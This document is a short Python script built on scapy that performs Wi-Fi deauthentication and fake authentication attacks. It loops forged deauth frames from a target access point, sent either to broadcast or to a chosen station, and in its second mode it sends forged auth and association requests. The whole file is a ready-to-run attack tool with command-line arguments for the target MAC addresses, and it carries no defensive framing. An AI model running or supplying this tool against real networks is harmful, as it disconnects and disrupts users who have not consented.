from scapy.all import *
from argparse import ArgumentParser as AP

# How to use
def usage():
    print("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]")
    print("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")


# Deauthentication Attack
def deauth(interace,ap_mac,station_mac):

    # AP broadcast
    if station_mac == None: 
        dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap_mac, addr3=ap_mac)
    # AP unicast
    else: 
        dot11 = Dot11(addr1=station_mac, addr2=ap_mac, addr3=ap_mac)

    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=interace, loop=1, inter=0.1)


# Authentication Attack
def auth(interace,ap_mac,station_mac):
    dot11 = Dot11(addr1=ap_mac, addr2=station_mac, addr3=ap_mac)
    auth = Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
    frame1 = RadioTap()/dot11/auth
    
    asso = Dot11AssoReq(cap=0x1100, listen_interval=0x00a) 
    essid = Dot11Elt(ID=0, info="Fake SSID")
    frame2 = RadioTap()/dot11/asso/essid
    
    for i in range(10):
        sendp(frame1, iface=interace, inter=0.1)
        time.sleep(1)
        sendp(frame2, iface=interace, inter=0.1)


# Parse Parameter
parser = AP(description="Deauth & Auth Attack")
parser.add_argument("interface",help="Network Interface")
parser.add_argument("ap_mac",help="Target AP Mac Address")
parser.add_argument("station_mac",help="Target Station Mac Address",nargs='?')
parser.add_argument("-auth",help="Authentication Attack Mode",nargs='?',default='deauth')
args = parser.parse_args()

# Check Parameter
if args.auth == 'deauth': # Deauth Attack
    deauth(args.interface,args.ap_mac,args.station_mac)
elif args.auth == None: # Auth Attack
    auth(args.interface,args.ap_mac,args.station_mac)
else:
    usage()
    sys.exit()
